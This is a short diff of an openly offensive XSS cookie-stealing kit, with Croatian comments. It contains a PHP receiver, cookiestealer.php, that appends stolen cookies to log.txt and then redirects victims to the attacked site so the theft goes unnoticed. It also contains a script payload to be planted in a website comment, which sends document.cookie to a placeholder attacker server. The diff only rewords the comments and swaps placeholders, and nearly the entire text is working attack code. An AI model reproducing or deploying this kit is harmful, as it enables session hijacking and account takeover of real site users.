@@ -1,10 +1,10 @@
 // Uploadamo ovaj file na server koji napadamo kao cookiestealer.php //
-// google.com promjenimo i stavimo ime web stranice koju napadamo, tako da korisnici ne prime redirekciju. //
-// kolačiči se spremaju u file log.txt //
+// [web_stranica_koju_napadamo] promjenimo i stavimo URL web stranice koju napadamo, tako da korisnici ne vide redirekciju. //
+// kolačiči se spremaju u datoteku log.txt //
 
 
 <?php
-header ('Location:https://google.com');
+header ('Location:[web_stranica_koju_napadamo]');
 
 $cookies = $_GET["c"];
 $file = fopen('log.txt', 'a');
@@ -13,8 +13,8 @@ fwrite($file, $cookies . "\n\n");
 
 
 // Kod koji možemo napisati u komentar na web stranici //
-// zamjenimo ATTACKER_SERVER pravim URL-om ili IP-om //
+// zamjenimo [NAPADAČKI_SERVER] pravim URL-om ili IP-om na kojeg želimo prosljediti informacije//
 
 <script type="text/javascript">
-document.location='http://ATTACKER_SERVER/cookiestealer.php?c='+document.cookie;
+document.location='http://[NAPADAČKI_SERVER]/cookiestealer.php?c='+document.cookie;
 </script>
